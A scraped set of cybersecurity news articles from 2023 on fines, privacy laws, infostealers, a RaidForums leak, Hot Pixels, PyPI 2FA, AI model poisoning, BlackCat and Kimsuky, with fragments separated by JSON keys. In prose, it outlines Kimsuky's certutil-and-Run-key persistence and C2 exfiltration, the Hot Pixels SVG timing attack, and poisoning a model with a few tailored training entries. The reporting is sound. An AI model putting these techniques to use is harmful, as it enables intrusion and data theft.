theft of data from more than a million of its Jewish Ashkenazi and Chinese users.On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

Practicefirst also failed to conduct penetration tests, vulnerability scans, or other security testing that would have identified these prevalent security issues.As a result, a threat actor “exploited the critical firewall vulnerability and successfully gained access to Practicefirst’s systems,” later deploying the ransomware and exfiltrating files that stored patient information. And “days later, screenshots containing personal information of 13 consumers were discovered on the dark web.”The state’s audit confirmed Practicefirst did not “maintain reasonable data security practices,” including failure to maintain appropriate patch management processes, conduct regular testing of systems, and encrypt the personal data stored on its servers.“Each and every company charged with maintaining and handling patient data should take their responsibility to protect personal information, particularly health records, seriously,” said New York Attorney General Leticia James, in a statement.The state settlement requires Practicefirst to maintain a comprehensive information security program, encrypt private and health data, and Implement a patch management solution to ensure timely patches and updates, in addition to employing multi-factor authentication when appropriate, among other effective account management and authentication procedures.Practicefirst must also develop of vulnerability management program, including routine scanning for security flaws and penetration testing and effective remediation of identified vulnerabilities. The settlement also includes a requirement for an update to the company’s data retention program, ensuring “private health information is maintained only to the minimum extent necessary to accomplish legitimate business purposes.”The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.The new PCI DSS standard puts more focus on application security, with more tools, testing and documentation required of developers.The SEC alleges SolarWinds and CISO Tim Brown defrauded investors by not disclosing security risks ahead of the 2020 Orion Sunburst attacks.U.S. federal agencies have experienced a significant reduction in known exploited security flaws across the networks since the release of the Cybersecurity and Infrastructure Security Agency's Known Exploited Vulnerabilities catalog more than two years ago, according to The Record, a news site by cybersecurity firm Recorded Future.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": "  OneMain Financial experienced at least three lengthy cybersecurity events between 2018 and 2020 brought on by a host of security program and access control failures that made it “more vulnerable to instances of unauthorized access,” according to the audit findings from the New York Department of Financial Services.Superintendent of Financial Services Adrienne A. Harris announced on May 25 that OneMain Financial will pay the state regulator a $4.25 million penalty to resolve the violations found during a routine DFS audit.The failures were tied to multiple cybersecurity incidents.In one example, DFS reported that from Dec. 29, 2017, through Jan. 9, 2018, a third-party vendor tasked with processing and managing online debit card payments gave some users unauthorized access to other customers’ NPI. The incident was deemed to be caused by the vendor failing to purge old customer account numbers before assigning the numbers to new accounts. Again in 2018, a hacker accessed the emails of OneMain’s collections law firm, which contained customer identifiers. Then on July 10, 2020, OneMain sent a link through its online portal that contained code tied to hundreds of customers, as part of the first stage of a software update.“Such code should have been thread safe, i.e., designed and tested to ensure it performs only as intended,” according to DFS findings. “This code was not thread-safe, however, and certain customers who logged into their accounts were unintentionally migrated to other account holders’ documents.”Under the 2017 DFS Cybersecurity Regulation, financial entities are required to adhere to a framework of security requirements that ensure companies are employing best practice measures to protect their information systems and consumer data from security risks.The cybersecurity regulation requires entities to limit user access privileges for systems that contain consumer data and periodically review access privileges. An audit into OneMain found the company failed to adequately manage third-party service provider risk and access privileges, and didn’t maintain a formal security development methodology for applications. Not only that, but the company’s own security found a host of vulnerabilities and security issues, but failed to remediate these issues.DFS also found deficiencies in OneMain’s cybersecurity program, which had not been found during its own internal audit unit.OneMain’s internal audit team found a host of issues tied to user access privileges in 2018 and 2019, through six manually conducted privilege access reviews. The manual nature of the audit introduced “a high risk of human error that is unacceptable for a network with hundreds of applications and more than 11,000 users.”The company’s audit team also discovered local administrative users were sharing accounts, making it difficult, if not impossible, to identify malicious actors. OneMain also allowed accounts to use default passwords provided by OneMain to users during onboarding, increasing the risk of unauthorized access.The internal audit also found passwords were being stored on shared drives and without adequate access restrictions. And though “the file containing the passwords was encrypted and password-protected, it was stored in a folder named ‘PASSWORDS.’”“Anyone with access to that internal shared drive, which included personnel in OneMain’s call center, could rename, move, or delete the folder,” according to DFS findings. The lack of protection could give a malicious actor easy access to the company’s information systems.Outside of the identity and access management flaws, DFS uncovered laundry list of vulnerabilities in OneMain’s application security program, cybersecurity training for workforce members, and its security policy for third-party vendors.The vendor issues, including a lack of “appropriate level of due diligence,” saw the company relying on at least eight business partners deemed high-risk and medium-risk. In multiple instances, DFS found OneMain allowed a vendor to begin work, even after making those risk-based determinations.What’s more, “OneMain failed to appropriately adjust the risk scores of several vendors after the occurrence of multiple cybersecurity events precipitated by the vendors’ improper handling of NPI and poor cybersecurity controls,” according to DFS. “Instead, OneMain simply terminated its relationship with each of the vendors and… without… enhancing its own third-party service policies.Harris said the OneMain settlement is intended to demonstrate DFS’ commitment to upholding its 2017 regulation, particularly companies with access to the financial data of consumers and will take “all actions necessary to protect the data of New Yorkers.”The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Thu Dec 7Tue Mar 26On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "title": "State lawmakers find bipartisan support for stronger privacy protections",
      "text": " State efforts to pass privacy legislation are heating up in the absence of federal progress on the issue.On May 19, Montana Governor Greg Gianforte signed the state’s own privacy law — SB 384 — which advocates say is one of the strongest privacy bills passed in a red state.Montana State Senator Daniel Zolnikov, who introduced the legislation, told Recorded Future News that he has been working to get a data privacy bill passed in the state since 2013 and was most proud of the fact that Montana is the first Republican-controlled legislature to pass a data privacy bill with a universal opt-out provision – what he called the “button that allows you to not be tracked online.”Several states have had difficulty getting such provisions into their data privacy bills because of fierce pushback from companies that have successfully fought for a specific verification – effectively an additional step many businesses hope consumers won't take – to avoid the opt-out.“So if you get that extension in your browser, then you can opt out of being tracked by everybody. And that is only passed in a few states,” he said.“I know there's been eight or nine states that have done [data privacy laws], but no Republican state has put that into their law and no Republican state has passed a law this strong. This is very exciting that this thing got passed.”Montana joins California, Colorado and Connecticut as one of the states with the most consumer-friendly data privacy bills passed so far.Matt Schwartz, policy analyst at Consumer Reports, has been tracking data privacy bills across the country and lauded Montana’s bill for including the right of consumers to access, delete, and stop the sale of their personal information.He noted that Consumer Reports worked with lawmakers to improve the legislation by adding universal opt-out provisions and removing certain exemptions.It also places a sunset on the “right to cure” in administrative enforcement – so that after April 2026, companies will no longer have a “get out of jail free” card for failing to protect consumer privacy, Schwartz said.The law is scheduled to go into effect on October 1, 2024.The bill in Montana becomes the third data privacy bill passed this year following efforts from Iowa and Indiana. Overall, Montana is the ninth state to pass any kind of overarching data privacy bill.This provision “rendered the right to opt-out of targeted advertising largely meaningless,” he said.Texas has versions of data privacy bills that have passed in the House and Senate but are currently in committee to hash out differences.Schwartz noted that with Texas, one of the biggest issues is that the Senate version included a universal opt-out provision while the House version did not – leaving experts in limbo about whether the bill will be effective or not.Privacy law expert Dan Clarke, who has worked with legislators in multiple states on their own data privacy bills, said there is significant momentum in several statehouses to get data privacy bills over the finish line.Clarke said a bill in Florida is likely to get passed this year but others in New Hampshire and New Jersey are either being tabled or narrowed in scope.Many of the bills getting passed are inspired by those in Virginia and Colorado — generally considered to be more business-friendly compared to consumer-focused bills in Connecticut and California.Clarke noted that the bill in Texas is emulating both Virginia and Colorado with certain provisions but also has unusual exemptions for what it considers “small businesses” – those with revenues between $1 million and $40 million or under 1,500 employees.But he said Texas is on the stronger side of the copycat laws and “joins the list of states aiming to put their stamp on privacy by deviating from what’s already out there.”“All that to say, there is no end in sight to the rapidly growing list of states attempting to close the federal privacy gap,” he said. “We’re still a long way from a simplified privacy in the United States, despite the parallels in proposed bills to existing and prospective laws tending to the uniform side.”Jeff Sizemore, a former information security officer in the U.S. Air Force who specialized in cryptography and now works for cloud software firm Egnyte, said it is remarkable that in a single legislative session, the United States went from 10% of its states having comprehensive data privacy acts to 20%.That, he said, demonstrates the impact of consumers’ desire for stronger data privacy legislation and the visibility of major data breaches that have affected consumers all across the country.Sizemore explained that most states are modeling their bills after others that have already been passed because it is easier to secure business community buy-in for legislation that they have complied with previously.“Both the VCDPA in Virginia and the CPA in Colorado are frequently modeled, because they strike a fair balance between the interest of consumers and businesses,” he said.“As we look forward, it’s surprising that certain states don’t yet have comprehensive legislation: Massachusetts, New York, New Jersey and Oregon. Also, large swaths of the Great Plains and Southeastern states have not had comprehensive bills introduced, or bills that have gone inactive, which is not surprising.”Zolnikov said one of the most exciting aspects of his bill in Montana was the overarching fact that the bill dispelled the notion that data privacy was an issue only backed by Democrats or that Republicans were only supporting bills that favored companies.Several Republican-led states, he said, were passing “watered-down” data privacy laws and he wanted a precedent to be set that “both sides of the aisle” want strong consumer protections.“The lobbyists are going to say, ‘Hey, look at these Republican states. Republicans, they don't go that far.’ So we need to set precedents at the state level of wanting true protections in place,” he said.“So now, at the federal stage, they can't divide the states by party, because we in Montana just broke the whole model. Now this is no longer a partisan issue.”Tech companies, he said, will eventually have to stop fighting federal legislation or else they will be dealing with a patchwork of privacy bills with wide-ranging requirements depending on the state.“50 different states with 50 different laws is regulatory hell. I am begging other Republican states to step up and actually implement real consumer privacy legislation and strengthen their laws.” he said.“And that's the whole point. We are passing laws at the state level to incentivize good positive action at the federal level.”Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " Cybersecurity researchers identified a new information-stealing malware that targets browsers and cryptocurrency wallets.For example, Bandit Stealer can bypass Windows Defender, a security tool developed by Microsoft to protect users from various types of threats, including viruses, malware and spyware.Trend Micro researchers have not identified any active hacking group associated with the malware, and have not determined how the group may use the stolen information.However, the group and its customers can potentially use the malware for activities like identity theft, data breaches, credential stuffing attacks and account takeovers, according to Trend Micro.Bandit Stealer was developed using the Go programming language, which is widely used and developed by Google. Go allows the malware to run on multiple operating systems and better avoid detection, Trend Micro said.Although Bandit Stealer advertises itself as “the most advanced info-stealer on the market” it has many similarities with other stealers, including Creal Stealer, Luna Grabber, Kyoku Cookie token stealer and Pegasus Stealer, according to Trend Micro.It targets a wide range of internet browsers and can steal various types of victims’ data, including usernames, current IPs, hard drive information, detailed information about the victim's computer and the country code associated with an IP address.It can also compromise the security of a victim’s Telegram messaging app, which is popular among cryptocurrency enthusiasts. Once Bandit Stealer gains unauthorized access to Telegram, it can impersonate the compromised user and potentially deceive others; the attackers can also access private messages and data associated with the compromised Telegram account.Bandit Stealer is persistent — it is executed every time the infected computer starts up or restarts, meaning that even after a system shutdown, the malware can still operate and steal data from the victim's system.According to Trend Micro, victims can unwittingly download Bandit Stealer while visiting malicious websites or through phishing emails.The malware opens a Word document on a victim’s computer and deceives the user into opening a seemingly harmless file. One of the documents obtained by Trend Micro was a memo expressing concerns about the victim’s job performance.Bandit Stealer can also pretend to be a fake installer for a program called Heartsender, which is typically used for automated email sending in advertising and marketing.Daryna Antoniuk\nis a freelance reporter for Recorded Future News based in Ukraine.

      "text": " Update added on 5/30/23 at end of article.A database for the notorious RaidForums hacking forums has been leaked online, allowing threat actors and security researchers insight into the people who frequented the forum.RaidForums was a very popular and notorious hacking and data leak forum known for hosting, leaking, and selling data stolen from breached organizations.Threat actors who frequented the forum would hack into websites or access exposed database servers to steal customer information. The threat actors then attempted to sell the data to other threat actors, who use it for their campaigns, such as phishing attacks, cryptocurrency scams, or distributing malware.In many cases, if data was not sold or some time had passed, the stolen data would be leaked for free on RaidForums to gain a reputation among the community.Earlier this month, a forum called 'Exposed' was launched, aiming to fill the void left behind by the closure of Breached, and it has quickly become popular.Today, one of the site's admins, 'Impotent,' leaked the RaidForums member database, exposing a wealth of information to other threat actors, researchers, and, potentially, law enforcement.BleepingComputer has seen the leaked data, and it consists of a single SQL file for the 'mybb_users' table used by RaidForums' forum software to store registration information.This table contains the registration information for 478,870 RaidForums members, including their usernames, email addresses, hashed passwords, registration dates, and a variety of other information related to the forum software.The leaked table contains member information for users who registered between March 20th, 2015, and September 24th, 2020, likely when the database was dumped.Impotent says that some RaidForums members have been removed from the database and that it is unknown when and why the dump was originally created.BleepingComputer has confirmed that the information for numerous accounts in the database contain known registration information. Additionally, members of the Exposed forum have also confirmed that their information is in the MySQL table, indicating that the leaked table is legitimate.While it's likely that the database is already in the hands of law enforcement after the forum was seized, this data could still be useful for security researchers who commonly build profiles of threat actors.Using the leaked registration information, researchers can learn more about the threat actors and potentially link them to other malicious activities.Update 5/30/23: Exposed's admin, Impotent, told BleepingComputer that the RaidForums data dump was originally not meant to be public, but they decided to leak it yesterday.However, while the admin states they know where the data came from, they promised not to disclose any details about the source.Impotent says the member database table still contains 99% of the original lines, with some removed to \"cause no drama.\""

      "text": "  Once they assumed complete control on the database engine, Dig Security’s researchers gained access to the operating system hosting the database. At that point they could access sensitive files in the host OS, list files and sensitive paths, read passwords and extract secrets from the machine. There’s a gray line between products and services, explained Timothy Morris, chief security advisor at Tanium. Morris said vulnerabilities aren’t always tied to a software product’s source code and attackers can exploit them because of misconfigurations. So any vendor offering software as a service, which cloud providers do, are providing services through prebuilt offerings that can use an array of hardware and software combinations, said Morris.“It’s not unusual for companies to not use the CVE process for disclosing vulnerabilities,” said Morris. “I’m not sure of the exact number, but it used to be that only about 50% of vulnerabilities are assigned a CVE. I would expect that number to be a lot less with services. As always, it’s important to understand what services are being purchased and as much of the components that make up that service offering as possible. Misconfigurations are still the leading cause of cloud data breaches.”Mike Parkin, senior technical engineer at Vulcan Cyber, added that privilege escalation can become a potential problem in almost any case, as it lets a user gain access to capabilities they shouldn't have. Parkin said while it’s interesting research from Dig Security, it’s light on details with nothing on how they escalated their privileges. It sounds like they just used basic SQL commands to add their user to a higher privilege group, but there's not enough detail to tell, said Parkin. “As for why there isn't a CVE on this, it appears to be an issue at the cloud infrastructure level, where only the cloud provider themselves could fix the issue,” Parkin said. “It's not a case where the user can patch, or change configuration, or otherwise mitigate or remediate the vulnerability. It's a very specific vulnerability with one vendor's internal platform.”U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Transitioning to cloud-native environments has brought along security risks for companies, according to TechRadar.Vulnerabilities in API authorization have been named by Wallarm as the second greatest security risk facing APIs, emphasizing the ease of leveraging authorizations as backdoors as well as the urgent need to ensure authorization maintenance, reports SiliconAngle.Tue Apr 23Wed Dec 6On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "title": "Hot Pixels attack checks CPU temp, power changes to steal data",
      "text": " A team of researchers at Georgia Tech, the University of Michigan, and Ruhr University Bochum have developed a novel attack called \"Hot Pixels,\" which can retrieve pixels from the content displayed in the target's browser and infer the navigation history.The attack exploits data-dependent computation times on modern system-on-a-chip (SoCs) and graphics processing units (GPUs) and applies them to stealthily extract information from visited web pages on Chrome and Safari, even if with the latest side-channel countermeasures enabled.The researchers found that modern processors struggle to balance power consumption requirements and heat dissipation limitations with high execution speeds. This leads to distinct behavior patterns that point to specific instructions and operations.These patterns are easily detectable through internal sensor measurements that are often accessible through software and, depending on the device type, can help discern what is viewed on the target device with an accuracy as high as 94%.By analyzing frequency, power, and temperature measurements on modern devices, the researchers concluded that passively cooled processors could leak information via power and frequency, while actively cooled chips leak data through temperature and power readings.The researchers experimented with Apple M1 chips, Cortex-X1 Arm cores inside a Google Pixel 6 Pro device, and Qualcomm Snapdragon 8 Gen 1 on OnePlus 10 Pro. They mapped the throttling points (thermal limits) and correlated the workloads with distinguishable frequency and power consumption metrics.Next, the team experimented with data-dependent leakage channels on discreet and integrated GPUs, including Apple's M1 and M2, AMD Radeon RX 6600, Nvidia GeForce RTX 3060, and Intel Iris Xe.The researchers performed a detailed investigation and characterization of how different processing behaviors (such as bit-flipping operations) could impact observable factors like power consumption, temperature, and frequency and used this data as a foundation to evaluate the \"Hot Pixels\" attack.The \"Hot Pixels\" attack was tested on Chrome 108 and Safari 16.2, the latest available versions at the time of the study, at their default configuration, including all side-channel countermeasures.The setup constraints the power and temperature of the CPUs so that data about the color of the pixels displayed on the target's screen (white or black) is leaked through the processor's frequency.The attack mechanism involves leveraging SVG filters to induce data-dependent execution on the target CPU or GPU and then using JavaScript to measure the computation time and frequency to infer the pixel color.To steal pixels from an unaffiliated target site, the researchers use an iframe element in an attacker-controlled page. The iframe's contents, which presumably contain sensitive info about the victim are invisible but can be computed by applying an SVG filter on top of it and measuring the rendering times.The accuracy of the measurements ranged between 60% and 94%, and the time required for deciphering each pixel was between 8.1 and 22.4 seconds.The \"leakiest\" device was AMD Radeon RX 6600, while the best-protected devices appear to be Apple's.Safari is not impacted by the attack described in the previous section due to blocking cookie transmission on iframe elements that don't have the same origin as the parent page. Hence, the loaded pixels on the iframe won't contain any user data.However, the researchers found that Safari is vulnerable to a sub-type of the Hot Pixels attack, which can compromise the user's privacy by sniffing their browsing history.The devised method includes placing links to sensitive pages on the attacker-controlled site and then using the SVG filtering technique to infer the color.Hyperlinks of visited sites should have a different color than those the target never visited, so the basic Hot Pixels principles can be applied to infer the target's browsing history.Also, because the entire hyperlink would have the same color, recovering just a single pixel from each would be enough, so very large lists of hyperlinks can be parsed in a short time.The accuracy of the data stolen in this attack reached 99.3% on iPhone 13, with just 2.5% false-negative findings and a recovery rate of 183 seconds per 50 hyperlinks.The researchers disclosed their findings to Apple, Nvidia, AMD, Qualcomm, Intel, and Google, in March. All vendors acknowledged the issues and are working to mitigate them.Hot Pixels attacks only work well on devices that quickly reach a stable state of power usage, like smartphones, although the data leak throughput is generally small.However, the impacted vendors and stakeholders already discuss solutions to the reported problems, like restricting the use of SVG filters on iframes on the HTML standard.The Chrome team already works on implementing the cookie isolation mechanism found in Safari that prevents loading cookies on orphan iframes.There are also proposals to restrict access to sensors that give away thermal, power, and frequency readings to unauthorized users at the OS level."

      "text": " The Python Package Index (PyPI) has announced that it will require every account that manages a project on the platform to have two-factor authentication (2FA) turned on by the end of the year.PyPI is a software repository for packages created in the Python programming language. The index hosts 200,000 packages, allowing developers to find existing packages that satisfy various project requirements, saving them time and effort.The PyPI team says the decision to make 2FA mandatory on all accounts is part of their long-term commitment to enhancing security on the platform, complementing previous measures taken in that direction, like blocking compromised credentials and supporting API tokens.One benefit of 2FA protection is the reduced risk of supply chain attacks. These types of attacks occur when a malicious actor gains control of the account of a software maintainer and adds a backdoor or malware to a package used as a dependency in various software projects.Depending on how popular the package is, such attacks can impact millions of users. While developers are responsible for thoroughly inspecting their project’s building blocks, PyPI’s measure should make it easier to minimize this type of problem.2FA protection will help mitigate the problem of account takeover attacks and should also set a limit on how many new accounts a suspended user can create to re-upload malicious packages.The requirement to set up 2FA on all project and organization maintainer accounts has the deadline to the end of 2023.In the following months, impacted users are recommended to prepare and enable the additional security measure using either a hardware key or an authentication app."

      "text": "  If Microsoft, Google and OpenAI refuse to share any parameters of their generative artificial intelligence platforms can we trust them?The secrecy-by-default culture of “big AI” is a dangerous precedent when considering society’s increased acceptance of generative AI and the possibility the tech could fall prey to bad actors. That’s the argument laid out by Baldur Bjarnason who warned in a recent blog that when AI is a black box it leaves the company’s using the tech vulnerable to a new form of \"black-hat keyword manipulation.”“We’ve known for a long time that AI models can be ‘poisoned,'\" Bjarnason wrote in an essay promoting an upcoming book. “If you can get an AI vendor to include a few tailored toxic entries — you don’t seem to need that many, even for a large model — the attacker can affect outcomes generated by the system as a whole.” Bjarnason said we don’t really know for sure because OpenAI doesn’t talk about its language and diffusion models or how it validates prompts it uses for training, how it vets training data sets and how it fine-tunes generated responses.“Even if we assume that the tendency towards pseudoscience and poor research isn’t inherent to the culture of AI research and just take for granted that, in a burst of enlightened self-awareness, the entire industry is going to spontaneously fall out of love with nonsense ideas and hyperbolic claims, the secrecy should still bother us,” wrote Bjarnason. “This much secrecy — or, information asymmetry — is a fatal blow to a free market.”One commenter, identified as IsmarGPT argued we risk harmful repercussions as tech elites and a fascinated public push for AI's blind usage, potentially learning a stern lesson the hard way. “AI has [the] potential to cause more damage than good but it, unfortunately looks like that, due mainly to short-term interest of the incumbent tech elite as well as the abundance of the mesmerized populace, we are going to find this out the hard way.”Another user, identified as Peter, said despite ChatGPT's buzz, skeptics see it as a mere probabilistic tool lacking genuine intelligence. “It’s only a matter of time before someone wrecks ChatGPT. The architects have been very clever about choosing the probability for each successive word, but random it remains. It has neither intelligence nor intention.”Strong opinions are understandable considering the growing pervasiveness and growth of generative AI. Forecast for the market for artificial intelligence hardware and services is forecast to grow to $90 billion by 2025 — from $36 billion in 2020, according to a market analysis by IDC and Bloomberg.“They don’t seem to require any special knowledge about the internals of the system,” wrote Bjarnsason. \"Black box attacks have been demonstrated to work on a number of occasions — which means that OpenAI’s secrecy is of no help.”Krishna Vishnubhotla, vice president of product strategy at Zimperium, said while attackers won’t break ChatGPT overnight, they can slowly poison it over time. Vishnubhotla said we will never truly know when that shift occurred to a \"broken\" state as it will be so subtle and over time.“OpenAI should consider allowing the research community access to their models,” said Vishnubhotla. “Enabling collaboration and knowledge sharing would foster advancements in various societal domains. By opening the model to external scrutiny, valuable insights can be gained, contributing to the model's refinement and mitigating the spread of misinformation. Such a powerful and indispensable technology should serve the greater good of humanity rather than being solely monetized by the private sector.”John Bambenek, principal threat hunter at Netenrich, said as it exists today, ChatGPT is mostly harmless. Like any tool, the risks matter when people attempt to do some work or task with it.“Today, we are in the novelty phase,” said Bambenek. “By way of analogy, when Facebook introduced facial recognition, it was also a novelty. When that same technology was applied to policing, we created human rights issues because the systems were less reliable in minority populations. Any AI/ML system should always keep a human in the mix. When we take the human out, it will break in bad ways as it is applied to more important problems than high schoolers trying to cheat on their papers.”Bambenek added that right now, nobody really knows how to regulate or ensure the security of AI/ML systems. One school of thought is to treat it like encryption with full transparency and significant reviews. That has great appeal, but he’s also concerned that the more we open up AI, the easier, not harder, it will be to attack.The new PCI DSS standard puts more focus on application security, with more tools, testing and documentation required of developers.After admitting responsibility for compromising Sony, a Colonial Pipeline supplier, and a Hawai'i government site, the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates, reports The Record, a news site by cybersecurity firm Recorded Future.Ukraine had experienced a less than a day-long power outage in October 2022 following an attack by Russian state-sponsored hacking operation Sandworm targeted at an electrical substation amid the ongoing Russia-Ukraine war, marking the first cyberattack-related power interruption in the country since 2017, CyberScoop reports.   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "title": "BlackCat ransomware takes control of protected computers via new kernel driver | SC Media",
      "text": "  The three companies published a coordinated disclosure that malicious kernel drivers were being signed through several Microsoft hardware developer accounts. The joint researchers said these profiles had been used in a number of cyberattacks that included ransomware incidents. Microsoft subsequently revoked several Microsoft hardware developer accounts that were abused in these attacks. The recent activity of the BlackCat ransomware group signals a disturbing escalation in the cyber threat landscape, said Craig Jones, vice president of security operations at Ontinue. Jones said by exploiting signed kernel drivers, this raises the stakes in an ongoing high-stakes game of \"digital cat and mouse\" between cyber criminals and those tasked with thwarting their attempts.“One of the intriguing aspects of this incident is the fact that the ransomware operators are using malicious kernel drivers signed through Microsoft's portals or using stolen certificates,” said Jones. “This offers them privileged-level access to the systems they attack and lets them bypass security protocols. It also indicates a high level of sophistication and a solid understanding of Windows system operations. They are essentially used to manipulate and control processes on the target systems, which includes disabling security measures, deleting files, and even forcing a system restart.” Murali Palanisamy, chief solutions officer at AppViewX, said this situation underscores the critical importance of securing code-signing certificates and implementing robust processes to secure and control the code signed using these certificates. As noted in the research, Palanisamy said the methods they used highlight a new capability by these threat actors using a signed kernel driver for evasion. Companies need to leverage security tools and best practices such as central secure key and distributed code signing service with processes and controls in place to protect and validate the signed code.“Manual processes or distributing the code-signing keys and certificates to different parties increases the potential for threat actors to exploit the keys,\" said Palanisamy. “Any compromise by one company can potentially affect any or all of its customers, further underscoring the need to focus on certificates and keys. And this issue further gets compounded by Google’s proposed reduction from 13 months to 90 days validity for public TLS certificates.”Callie Guenther, cyber threat research senior manager at Critical Start, said this new research offers valuable insights into the evolving techniques used by ransomware operators and emphasizes the importance of collaboration, monitoring, and proactive security measures to mitigate the risks associated with malicious kernel drivers and defense evasion techniques.Guenther said Microsoft's response to the reported abuse of its hardware developer accounts by revoking the compromised accounts was a crucial step to prevent further misuse, but does not address the root issue by detecting the behavior sequences that led to the abuse.“This vendor action is typical and expected, but demonstrates the need for proactive measures to address security vulnerabilities in the signing process,\" said Guenther. \"Also, the observations and findings described in the report are not exclusive to the BlackCat ransomware group. The techniques and trends discussed, such as the use of signed kernel drivers, abuse of signing portals, and the purchase or theft of certificates, can be employed by various threat actors across the cybersecurity landscape.\"After admitting responsibility for compromising Sony, a Colonial Pipeline supplier, and a Hawai'i government site, the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates, reports The Record, a news site by cybersecurity firm Recorded Future.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.Attack on the U.S. subsidiary of the Industrial & Commercial Bank of China disrupted Treasury trading in New York earlier this week.

      "text": "  The United States Treasury Department levied economic sanctions on a score of North Korean entities and one individual central to the rogue state’s illicit online activities, the same day research emerged about the latest targeted cyberattacks carried out by a North Korean espionage threat group.Treasury’s Office of Foreign Assets Control levied sanctions against Pyongyang University of Automation, which it said trains hackers who often go on to work for the DPRK’s main offensive cyber branch, the Reconnaissance General Bureau (RGB).It also sanctioned the RGB’s Technical Reconnaissance Bureau (TRB) and its cyber unit, the 110th Research Center, along with DPRK-based Chinyong Information Technology Cooperation Company and one of its representatives, Kim Sang Man. Chinyong, believed to be an arm of the Ministry of People’s Armed Forces, North Korea’s defense agency, sends delegations of IT workers to countries like Russia and Laos, where some can earn salaries up to $300,000 a year to send money back to the regime.U.S. officials said they believe Kim, a North Korean national based in Vladivostok, Russia, is an agent of the RBG who buys and acquires IT equipment on behalf of the regime and helps send payments to family members of IT workers overseas. He also helps to route cryptocurrency payments to Pyongyang, transferring at least $2 million in funds sent by IT workers in Russia and China in 2021.Although unlikely to have any practical impact on North Korea’s cyber exploits, the sanctions enable the government to seize any U.S.-based assets it discovers belonging to the entities. Treasury officials said that, like many hacking campaigns out of Pyongyang, the work of these entities were designed to support the country’s nuclear weapons program, which President Kim Jong Un and military leaders see as key to the regime’s long-term survival.“Today’s action continues to highlight the DPRK’s extensive illicit cyber and IT worker operations, which finance the regime’s unlawful weapons of mass destruction and ballistic missile programs,” said Brian E. Nelson, Under Secretary of the Treasury for Terrorism and Financial Intelligence.It said the DPRK had thousands of IT workers who took up international freelance employment contracts to help fund the nation’s weapons programs and to gain network access to enable cyberattacks.“Like other DPRK workers employed in third countries, DPRK remote IT workers may be subjected to forced labor and constant and close surveillance by government security agents,” the State Department said.“IT workers have also been forced to work 12-16 hours per day, which may be an indicator of forced labor and an abuse of their human rights.”“The malware’s ability to exfiltrate valuable information, such as hardware, operating system, and file details, indicates its pivotal role in Kimsuky’s reconnaissance operations for enabling tailored attacks,” wrote Aleksandar Milenkoski, a senior threat researchers at SentinelLabs.Milenkoski said Kimsuky uses specially crafted phishing emails to deploy RandomQuery. The emails included a Microsoft Compiled HTML Help (CHM) attachment containing a malicious shortcut object that, when clicked, created a Base-64 encoded file in the %USERPROFILE%\\Links\\ directory.It decoded the file using the certutil utility, creating a VB script, and then stored the script in a separate file. Persistence was established by editing the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry key so the new VB script was executed at system startup.The VB script issued a HTTP GET request to a command-and-control server URL and executed the second-stage payload returned from the server.The RandomQuery variant used by Kimsuky set Internet Explorer configurations that enabled the uninterrupted use of the browser by the malware, which then gathered and exfiltrated information about the infected platform.Exfiltration involved Base64-encoding the gathered information and then constructing and issuing an HTTP POST request containing the information to the command-and-control server URL.Milenkoski said the persistent attacks carried out by Kimsuky and its “continuously advancing attack toolkit ... underscore the ever-changing landscape of North Korean threat groups, whose remit not only encompasses political espionage but also sabotage and financial threats.”Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

      "text": "  A critical API flaw in the Expo open-source framework allowed attackers to harvest auth credentials via the Open Authorization (OAuth) protocol. The vulnerability, while impacting a relatively small number of developers, had the potential to impact a wide range of users logging in to online services such as Facebook, Twitter or Spotify via the open-source framework, according to the researchers at Salt Labs who found the bugs.A successful attack could of allowed an adversary to take over accounts and steal credentials on a mobile app or website that was configured to use the Expo AuthSession Redirect Proxy. Attacks could have been triggered simply by a victim clicking on a malicious link.   Expo (auth.expo.io) is used by developers to build native apps for iOS, Android and web platforms using a single set of tools, libraries and services and considered an effective way to accelerate the development process of applications. \"The vulnerability may impact hundreds of companies using Expo, including Codecademy,\" according to Salt Labs. Researchers stress \"the surface area of auth.expo.io is small\" thereby reducing the number of impacted social sign-on instances. Zane Bond, head of product at Keeper Security, said engineers implementing OAuth should question what the different options do, choose the more secure option when possible, and be sure to validate the potential impact when choosing options outside of defaults.“For security-conscious users, using OAuth to create accounts on third-party apps or websites comes with both security advantages and risks that should be weighed on a case-by-case basis,” said Bond.Mike Parkin, senior technical engineer at Vulcan Cyber, said the potential risk from the OAuth vulnerability was relatively broad. “The challenge with any 